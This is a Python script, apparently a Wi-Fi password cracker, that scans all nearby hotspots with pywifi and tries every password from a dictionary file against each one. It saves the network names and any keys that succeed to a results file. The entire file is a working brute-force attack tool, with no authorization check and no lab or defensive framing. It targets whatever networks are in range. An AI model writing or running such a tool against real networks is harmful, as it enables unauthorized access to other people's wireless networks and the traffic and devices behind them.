#!/usr/bin/python
# -*- coding: utf-8 -*-

import pywifi
import time
import sys


# 扫描周围热点
def scans(face, timeout):
    # 开始扫描
    face.scan()
    time.sleep(timeout)
    # 若干秒后获取扫描结果
    return face.scan_results()


# 热点测试
def test(i, face, x, key, stu, ts):
    # 显示对应网络名称
    show_id = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
    # 迭代字典并进行破解
    for n, k in enumerate(key):
        x.key = k.strip()
        # 移除所有热点配置
        face.remove_all_network_profiles()
        face.connect(face.add_network_profile(x))
        code = 10
        t1 = time.time()
        while code != 0:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            if now > ts:
                break
            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s" % (
            6, i, 18, show_id, code, 5, now, 7, x.signal, 10, len(key) - n, 10, k.replace("\n", "")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)
    return False


# 配置扫描器
def main():
    # 扫描时常
    scan_times = 3
    # 单个密码测试延迟
    test_times = 15
    output = sys.stdout
    # 结果文件保存路径
    files = "TestRes.txt"
    # 字典列表
    # keys = open(sys.argv[1], "r").readlines()
    keys = open("./cracker_dict.txt", "r").readlines()
    print("|KEYS %s" % (len(keys)))
    # 实例化一个pywifi对象
    wifi = pywifi.PyWiFi()
    # 选择定一个网卡并赋值于iface
    iface = wifi.interfaces()[0]
    # 通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置
    scanres = scans(iface, scan_times)
    # 统计附近被发现的热点数量
    nums = len(scanres)
    print("|SCAN GET %s" % (nums))
    print("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s" % (
        "-" * 70, 6, "WIFIID", 18, "SSID OR BSSID", 2, "N", 4, "time", 7, "signal", 10, "KEYNUM", 10, "KEY", "=" * 70))
    # 将每一个热点信息逐一进行测试
    for i, x in enumerate(scanres):
        # 测试完毕后，成功的结果讲存储到files中
        res = test(nums - i, iface, x, keys, output, test_times)
        if res:
            open(files, "a").write(res)

if __name__ == '__main__':
    main()


# Error
# python wificracker.py cracker_dict.txt
